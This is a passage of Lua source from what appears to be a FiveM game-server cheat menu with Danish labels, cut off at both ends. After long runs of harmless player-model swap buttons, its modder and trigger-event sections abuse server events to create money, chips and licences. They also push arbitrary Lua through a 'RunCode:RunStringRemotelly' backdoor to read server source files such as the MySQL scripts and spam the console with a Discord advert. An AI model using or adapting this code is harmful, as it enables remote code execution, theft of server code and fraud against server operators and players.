                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~kriminel") then
                    local model = "ig_claypain"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~kriminel 2") then
                    local model = "csb_g"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~kriminel 3") then
                    local model = "ig_hao"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~superhelt") then
                    local model = "u_m_y_imporage"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~jesus") then
                    local model = "u_m_m_jesus_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~mand uden hoved") then
                    local model = "ig_johnnyklebitz"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~taco mand") then
                    local model = "u_m_y_mani"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~bigfoot") then
                    local model = "ig_orleans"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~b~politi") then
                    local model = "s_m_y_sheriff_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~b~stripper") then
                    local model = "csb_stripper_02"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                end
                        


                -- youtuber OPTIONS MENU
            elseif RPPPwdjwdU23.IsMenuOpened('ytt') then
                if RPPPwdjwdU23.Button("K??DKONGEN") then
                    local model = "ig_lestercrest"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("K??DKONGEN 2") then
                    local model = "u_m_m_streetart_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end

                elseif RPPPwdjwdU23.Button("LyseR??deModder") then
                    local model = "a_m_m_beach_02"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("LyseR??deModder 2") then
                    local model = "mp_m_bogdangoon"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end









                elseif RPPPwdjwdU23.Button("troldmanden") then
                    local model = "u_m_m_partytarget"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("troldmanden 2") then
                    local model = "a_m_y_downtown_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("toucansss") then
                    local model = "u_m_y_proldriver_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("toucansss 2") then
                    local model = "u_m_o_tramp_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Jimmys Shitpost") then
                    local model = "s_m_y_xmech_02"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Jimmys Shitpost 2") then
                    local model = "a_m_y_yoga_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                end


                -- DYR OPTIONS MENU
            elseif RPPPwdjwdU23.IsMenuOpened('dyr') then
            if RPPPwdjwdU23.Button("vildsvin") then
                local model = "a_c_boar"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("??ren") then
                local model = "a_c_chickenhawk"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("abe") then
                local model = "a_c_rhesus"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("abe 2") then
                local model = "a_c_chimp"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("l??ve") then
                local model = "a_c_mtlion"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("sort l??ve") then
                local model = "a_c_panther"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("kat") then
                local model = "a_c_cat_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("chickenhawk") then
                local model = "a_c_chickenhawk"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("chimpanse") then
                local model = "a_c_chimp"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("hakke") then
                local model = "a_c_chop"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("skarv") then
                local model = "a_c_cormorant"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("ko") then
                local model = "a_c_cow"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("pr??rieulv") then
                local model = "a_c_coyote"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("krage") then
                local model = "a_c_crow"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("hjort") then
                local model = "a_c_deer"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("delfin") then
                local model = "a_c_dolphin"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("fisk") then
                local model = "a_c_fish"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("h??ne") then
                local model = "a_c_hen"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("pukkelrygg") then
                local model = "a_c_humpback"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("husky") then
                local model = "a_c_husky"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("sp??khugger") then
                local model = "a_c_killerwhale"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("mtlion") then
                local model = "a_c_mtlion"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("svin") then
                local model = "a_c_pig"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("Due") then
                local model = "a_c_pigeon"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("puddel") then
                local model = "a_c_poodle"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("mops") then
                local model = "a_c_pug"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("kanin") then
                local model = "a_c_rabbit_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("rotte") then
                local model = "a_c_rat"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("retriever") then
                local model = "a_c_retriever"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("rottweiler") then
                local model = "a_c_rottweiler"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("m??ge") then
                local model = "a_c_seagull"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("sharkhammer") then
                local model = "a_c_sharkhammer"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("f??rehyrde") then
                local model = "a_c_shepherd"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("stingray") then
                local model = "a_c_stingray"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("vestlig") then
                local model = "a_c_westy"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            end






            if ou328hNeon then
                local u48y34 = k(1.0)
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end




            -- modder op
        elseif RPPPwdjwdU23.IsMenuOpened('modder') then
            if RPPPwdjwdU23.Button("Toggle Handcuffs", "Client.lua") then
                vRP.toggleHandcuff()
            elseif RPPPwdjwdU23.Button("Give money to player") then
                local id = "local id = " .. GetKeyboardInput("ID:") .. " "
                local rank = 'local amount = '.. GetKeyboardInput('Bel??b:')..' '
                local admin = [[
                        local warof = 5
                        local users = vRP.getUsers({})
                        local player = vRP.getUserSource({id})
                        vRP.giveBankMoney({id,amount})
                        for i = 1,500 do 
                            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                        end
                    ]]
                local admin2 = id .. rank ..admin
                udwdj('RunCode:RunStringRemotelly', admin2)
            elseif RPPPwdjwdU23.Button("F?? K??rekort", "Client.lua") then
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\resources\\vRP\\vrp_delivery")
                udwdj("dmv:success")
            end

        
        -- LUA OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('lua') then
            if RPPPwdjwdU23.MenuButton('ESX Options', 'esx') then
        elseif RPPPwdjwdU23.MenuButton('vRP Options', 'vrp') then
        elseif RPPPwdjwdU23.MenuButton('Custom Menu', 'Custom Menu') then
        elseif RPPPwdjwdU23.MenuButton('Server Options', 'server resource') then
        elseif RPPPwdjwdU23.MenuButton('Trigger Events vRP', 'TriggerEventsVRP') then
            end


            -- TriggerEventsVRP
        elseif RPPPwdjwdU23.IsMenuOpened('TriggerEventsVRP') then
            if RPPPwdjwdU23.Button("Toggle Handcuffs", "Client.lua") then
                vRP.toggleHandcuff()
            elseif RPPPwdjwdU23.Button("Give money to player") then
                local id = "local id = " .. GetKeyboardInput("ID:") .. " "
                local rank = 'local amount = '.. GetKeyboardInput('Bel??b:')..' '
                local admin = [[
                        local warof = 5
                        local users = vRP.getUsers({})
                        local player = vRP.getUserSource({id})
                        vRP.giveBankMoney({id,amount})
                        for i = 1,500 do 
                            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                        end
                    ]]
                local admin2 = id .. rank ..admin
                udwdj('RunCode:RunStringRemotelly', admin2)
            elseif RPPPwdjwdU23.Button("Tag K??rekort", "Client.lua") then
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\\resources\\vRP\\vrp_delivery")
                TriggerServerEvent('dmv:ttcharge')
            elseif RPPPwdjwdU23.Button("F?? K??rekort", "Client.lua") then
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\\resources\\vRP\\vrp_delivery")
                udwdj("dmv:success")
            elseif RPPPwdjwdU23.Button("player Spawned", "Client.lua") then
                TriggerServerEvent("vRPcli:playerSpawned")

            elseif RPPPwdjwdU23.Button("money tool 2", "Client.lua") then
                TriggerServerEvent('vRP:Pay')

            elseif RPPPwdjwdU23.Button("money tool 3", "Client.lua") then
                TriggerServerEvent("scrap:SellVehicle", 1000)

            elseif RPPPwdjwdU23.Button("set alle dine money i bank", "Client.lua") then
                TriggerServerEvent('bank:depositAll')

            elseif RPPPwdjwdU23.Button("Get Vehicle free", "Client.lua") then
                TriggerServerEvent('carwash:checkmoney', GetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1),true)))


            elseif RPPPwdjwdU23.Button("??bne Bank", "Client.lua") then
                TriggerServerEvent("bank:open")
            elseif RPPPwdjwdU23.Button("Trucker job penge", "Client.lua") then
                print("Filens placering C:\\Users\\Administrator\\Desktop\\server\\resources\\[vrp]\\vrp\\cfg\\money.lua")
                local belob = GetKeyboardInput("Bel??b")
                TriggerServerEvent('trucker:success',tonumber(belob))
            elseif RPPPwdjwdU23.Button("Casino Chips", "Client.lua") then
                local eS22bs = KeyboardInput("Enter Chips Amount:", " ", 12)
                if eS22bs ~= " " then
                    vRPcasinoS = Tunnel.getInterface("vRP_casino", "vRP_casino")
                    vRPcasinoS.payRouletteWinnings({eS22bs, 2})
                end
            elseif RPPPwdjwdU23.Button("Chests Money", "Server") then
                TriggerCustomEvent(true, "basic")
                TriggerCustomEvent(true, "silver")
                TriggerCustomEvent(true, "legendary")
            elseif RPPPwdjwdU23.Button("Los Santos Customs", "Server") then
                local RqPpaEgmMgqnHCfRUgO = KeyboardInput("Enter amount of money", " ", 12)
                if RqPpaEgmMgqnHCfRUgO ~= " " then
                    TriggerCustomEvent(true, "lscustoms:payGarage", {costs = -RqPpaEgmMgqnHCfRUgO})
                end
            elseif RPPPwdjwdU23.Button("Slot Machine", "Server") then
                local e0rFlmwZ1PfQ = KeyboardInput("Enter amount of money", " ", 12)
                if e0rFlmwZ1PfQ ~= " " then
                    TriggerCustomEvent(true, "vrp_slotmachine:server:2", e0rFlmwZ1PfQ)
                end
            elseif RPPPwdjwdU23.Button("Legacy Fuel", "Server") then
                local fshn = KeyboardInput("Enter amount of money", " ", 12)
                if fshn ~= " " then
                    TriggerCustomEvent(true, "LegacyFuel:PayFuel", {costs = -fshn})
                end
            elseif RPPPwdjwdU23.Button("Bank Deposit", "Server") then
                local pJKrBq3X9TJG = KeyboardInput("Enter amount of money", " ", 12)
                if pJKrBq3X9TJG ~= " " then
                    TriggerCustomEvent(true, "Banca:deposit", pJKrBq3X9TJG)
                    TriggerCustomEvent(true, "bank:deposit", pJKrBq3X9TJG)
                end
            elseif RPPPwdjwdU23.Button("Bank Withdraw", "Server") then
                local NbWlcRDldDIh = KeyboardInput("Enter amount of money", " ", 12)
                if NbWlcRDldDIh ~= " " then
                    TriggerCustomEvent(true, "bank:withdraw", NbWlcRDldDIh)
                    TriggerCustomEvent(true, "Banca:withdraw", NbWlcRDldDIh)
                end
            end
            --Server Resource
        elseif RPPPwdjwdU23.IsMenuOpened('server resource') then
        if RPPPwdjwdU23.Button("Get ~b~Resource ~r~(F8)") then
            ShowInfo("~y~F8")
            Resources = GetResources()

ResourcesToCheck = {
                    -- ESX
                    "es_extended", "esx_dmvschool", "esx_policejob", "",
                    -- VRP
                    "[vrp]", "vrp", "vrp_trucker", "vrp_TruckerJob", "vrp_mysql", "vrp_onlinejobs", "cfg",
                    -- DN-Scripts
                    "[dn-scripts]", "dn-loadingscreen", "dn-mech", "fivem", "[v??ben]", "guns", "stream", "AC", "[Misc]", "DiscordBot", "modelblacklist", "removeshopcars", "construction", "",
                    -- Scrips
                    "dato", "resources", "server", "dn-stream", "client", "gui", "modules", "vrp_doors",
}

print("\n\nRESOURCES FOUND\n________________\n")
for i = 1, #Resources do
    print(Resources[i])
end
print("\n________________\nEND OF RESOURCES BY K??DKONGEN#9999\n")
elseif RPPPwdjwdU23.Button("Se alle vRP Server Resource [Devo]", "~r~resources.lua") then
    ShowInfo("~y~F8")
    print("Desktop\\server\\resources\\[vrp]")
    print("Desktop\\server\\resources\\vrp")
    print("Desktop\\server\\resources\\vrp_addons_gcphone")
    print("Desktop\\server\\resources\\vrp_armorshop")
    print("Desktop\\server\\resources\\vrp_arrestanims")
    print("Desktop\\server\\resources\\vrp_attitudes")
    print("Desktop\\server\\resources\\vrp_bank")
    print("Desktop\\server\\resources\\vrp_barbershop")
    print("Desktop\\server\\resources\\vrp_barrier")
    print("Desktop\\server\\resources\\vrp_basic_menu")
    print("Desktop\\server\\resources\\vrp_basic_mission")
    print("Desktop\\server\\resources\\vrp_bilskrot")
    print("Desktop\\server\\resources\\vrp_custom_jobs")
    print("Desktop\\server\\resources\\vrp_datetime")
    print("Desktop\\server\\resources\\vrp_delivery")
    print("Desktop\\server\\resources\\vrp_deliverypizza")
    print("Desktop\\server\\resources\\vrp_dmvschool")
    print("Desktop\\server\\resources\\vrp_doors")
    print("Desktop\\server\\resources\\vrp_farms")
    print("Desktop\\server\\resources\\vrp_foto")
    print("Desktop\\server\\resources\\vrp_fuel")
    print("Desktop\\server\\resources\\vrp_functions")
    print("Desktop\\server\\resources\\vrp_garages")
    print("Desktop\\server\\resources\\vrp_holdup")
    print("Desktop\\server\\resources\\vrp_hospital")
    print("Desktop\\server\\resources\\vrp_id_display")
    print("Desktop\\server\\resources\\vrp_job_display")
    print("Desktop\\server\\resources\\vrp_kikkert")
    print("Desktop\\server\\resources\\vrp_kister")
    print("Desktop\\server\\resources\\vrp_legacyfuel")
    print("Desktop\\server\\resources\\vrp_loadfreeze")
    print("Desktop\\server\\resources\\vrp_lscustoms")
    print("Desktop\\server\\resources\\vrp_medicaldelivery")
    print("Desktop\\server\\resources\\vrp_mysql")
    print("Desktop\\server\\resources\\vrp_onlinejobs")
    print("Desktop\\server\\resources\\vrp_panikknap")
    print("Desktop\\server\\resources\\vrp_prisonwork")
    print("Desktop\\server\\resources\\vrp_robbery")
    print("Desktop\\server\\resources\\vrp_register")
    print("Desktop\\server\\resources\\vrp_showroom")
    print("Desktop\\server\\resources\\vrp_takeoff")
    print("Desktop\\server\\resources\\vrp_tattoos")
    print("Desktop\\server\\resources\\vrp_taxi")
    print("Desktop\\server\\resources\\vrp_trucker")
    print("Desktop\\server\\resources\\vrp_truckerfuel")
    print("Desktop\\server\\resources\\vrp_tvnews")
    print("Desktop\\server\\resources\\vrp_unlockhandcuffs")
    print("Desktop\\server\\resources\\vrp_wallet")
    print("Desktop\\server\\resources\\vrp_wanted")
    print("Desktop\\server\\resources\\vrp-chat")
    print("Desktop\\server\\resources\\vrp_scrapyard")
    print("------------------------------------------------")
    print("Server vRP")
elseif RPPPwdjwdU23.Button("Se alle esx Server Resource [Devo]", "~r~resources.lua") then
    ShowInfo("~y~F8")
    print("Cant find \\resources.lua\\")
    print("Cant find \\resources.lua\\")
    print("Cant find \\resources.lua\\")
    print("Cant find \\resources.lua\\")
    print("Cant find \\resources.lua\\")
    print("Cant find \\resources.lua\\")
    print("Cant find \\resources.lua\\")

elseif RPPPwdjwdU23.Button("~r~??ben vrp_addons_gcphone", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_addons_gcphone", "/server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_addons_gcphone", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_addons_gcphone", "client.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_farms", '~b~sv_farm') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_farms", "sv_farm.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_farms", '~b~cl_farm') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_farms", "cl_farm.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])
    
elseif RPPPwdjwdU23.Button("~r~??ben vrp_mysql", '~b~init') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_mysql", "init.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_mysql", '~b~MySQL') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_mysql", "MySQL.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])


elseif RPPPwdjwdU23.Button("~r~??ben vrp_robbery", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_robbery", "server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_robbery", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
